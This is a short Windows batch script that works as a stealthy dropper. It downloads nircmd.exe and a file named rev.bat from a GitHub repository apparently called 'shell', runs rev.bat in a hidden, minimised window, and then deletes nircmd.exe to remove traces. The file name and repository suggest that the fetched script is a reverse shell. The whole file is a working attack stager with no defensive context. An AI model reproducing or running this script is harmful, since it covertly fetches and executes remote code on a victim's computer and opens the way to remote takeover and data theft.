@echo off
if not exist "%~dp0nircmd.exe" (
    curl https://raw.githubusercontent.com/0x2034/shell/main/nircmd.exe -o "%~dp0nircmd.exe"
)
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o rev.bat
start /min cmd /c "%~dp0nircmd.exe" exec hide cmd /c rev.bat
del "%~dp0nircmd.exe"
